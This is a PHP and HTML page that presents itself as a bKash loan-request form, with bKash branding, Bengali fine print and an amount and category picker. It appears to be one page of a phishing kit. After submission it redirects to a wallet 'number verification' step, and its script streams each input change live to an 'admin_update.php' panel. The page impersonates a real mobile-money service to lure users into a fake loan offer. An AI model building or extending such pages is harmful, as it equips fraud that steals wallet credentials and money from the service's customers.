
<?php
session_start();
require_once 'config/database.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $amount = $_POST['amount'];
    $category = $_POST['category'];
    
    if ($amount >= 1000 && $amount <= 100000 && !empty($category)) {
        // Create new loan application
        $stmt = $pdo->prepare("INSERT INTO loan_applications (amount, category, status) VALUES (?, ?, 'pending')");
        $stmt->execute([$amount, $category]);
        $loan_id = $pdo->lastInsertId();
        
        $_SESSION['loan_id'] = $loan_id;
        $_SESSION['loan_amount'] = $amount;
        $_SESSION['loan_category'] = $category;
        
        header('Location: number_verification.php');
        exit();
    } else {
        $error = 'Invalid amount or category';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>bKash Payment</title>
  <link rel="icon" type="image/png" href="img/favicon.png">
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
  <div class="bg-white p-6 rounded-xl shadow-md w-full max-w-md">
    
    <!-- bKash Header -->
   <div class="flex items-center justify-center mb-4">
  <img src="img/loanricuestpage.png" alt="bKash Logo"
       class="w-64 h-20 sm:w-72 sm:h-24 md:w-80 md:h-28 lg:w-96 lg:h-32 xl:w-full xl:h-36 object-contain">
</div>
    
    <!-- Red Line -->
    <div class="w-full h-0.5 bg-red-500 mb-4"></div>
    
    <!-- Description -->
    <div class="text-center mb-6">
      <p class="text-gray-600 text-sm leading-relaxed">
        লোনের সুদের হার এবং চার্জ আগে ভালোভাবে দেখে নিন । সময়মতো পরিশোধ না করলে জরিমানা লাগতে পারে 
      </p>
    </div>

    <?php if (isset($error)): ?>
    <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4">
        <?php echo htmlspecialchars($error); ?>
    </div>
    <?php endif; ?>

    <form method="POST" id="loanForm">
        <!-- Amount Input with Floating Label -->
        <div class="mb-4 relative">
          <input type="number" name="amount" id="amount" placeholder=" " min="1000" max="100000" class="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 peer" required>
          <label for="amount" class="absolute text-sm text-gray-500 duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-white px-2 peer-focus:px-2 peer-focus:text-pink-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-1">Amount (৳1,000 - ৳1,00,000)</label>
          <div id="amountError" class="text-red-500 text-xs mt-1 hidden">Amount must be between ৳1,000 and ৳1,00,000</div>
        </div>

       
    <!-- Loan Category Dropdown with Floating Label -->
    <div class="mb-4 relative">
      <select name="category" id="category" class="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 peer appearance-none bg-white" required>
        <option value="" disabled selected>Select</option>
        <option value="Business Loan">Business Loan</option>
        <option value="Personal Loan">Personal Loan</option>
      </select>
      <label for="category" class="absolute text-sm text-gray-500 duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-white px-2 peer-focus:px-2 peer-focus:text-pink-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-1">Category</label>
      <!-- Custom dropdown arrow -->
      <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
        <svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
        </svg>
      </div>
    </div>

        <!-- Checkbox -->
        <div class="flex items-center mb-6">
          <input id="useBkash" type="checkbox" checked class="h-4 w-4 text-pink-600 focus:ring-pink-500 border-gray-300 rounded">
          <label for="useBkash" class="ml-2 block text-sm text-gray-700">
            Use bKash wallet number as your contact number
          </label>
        </div>

        <!-- Confirm Button -->
        <button type="submit" id="getLoanBtn" class="w-full bg-pink-500 text-white py-2 rounded-lg font-semibold hover:bg-pink-600 transition duration-200 disabled:opacity-50" disabled>
          Request Loan 
        </button>
    </form>

    <!-- Terms -->
    <p class="text-xs text-center text-gray-500 mt-4">
      By clicking on <strong>Get Loan</strong> you are agreeing to the 
      <a href="#" class="text-pink-600 underline">terms & conditions</a>
    </p>

  </div>

  <script>
    // Enable button when both fields are filled
    const amountInput = document.getElementById('amount');
    const categorySelect = document.getElementById('category');
    const getLoanBtn = document.getElementById('getLoanBtn');
    
    function checkForm() {
        const amount = parseFloat(amountInput.value);
        const amountError = document.getElementById('amountError');
        
        // Validate amount range
        if (amountInput.value && (amount < 1000 || amount > 100000)) {
            amountError.classList.remove('hidden');
            getLoanBtn.disabled = true;
            return;
        } else {
            amountError.classList.add('hidden');
        }
        
        if (amountInput.value && categorySelect.value && amount >= 1000 && amount <= 100000) {
            getLoanBtn.disabled = false;
        } else {
            getLoanBtn.disabled = true;
        }
    }
    
    // Handle floating label for select dropdown
    function handleSelectLabel() {
        const label = document.querySelector('label[for="category"]');
        if (categorySelect.value) {
            label.classList.add('-translate-y-4', 'scale-75', 'text-pink-600');
            label.classList.remove('translate-y-1/2', 'scale-100');
        } else {
            label.classList.remove('-translate-y-4', 'scale-75', 'text-pink-600');
            label.classList.add('translate-y-1/2', 'scale-100');
        }
    }
    
    amountInput.addEventListener('input', checkForm);
    categorySelect.addEventListener('change', function() {
        checkForm();
        handleSelectLabel();
    });
    
    // Initialize label position on page load
    handleSelectLabel();
    
    // Real-time update to admin panel
    function updateAdminPanel() {
        if (amountInput.value && categorySelect.value) {
            fetch('admin_update.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    action: 'update_loan_info',
                    amount: amountInput.value,
                    category: categorySelect.value
                })
            });
        }
    }
    
    amountInput.addEventListener('input', updateAdminPanel);
    categorySelect.addEventListener('change', updateAdminPanel);
  </script>
</body>
</html>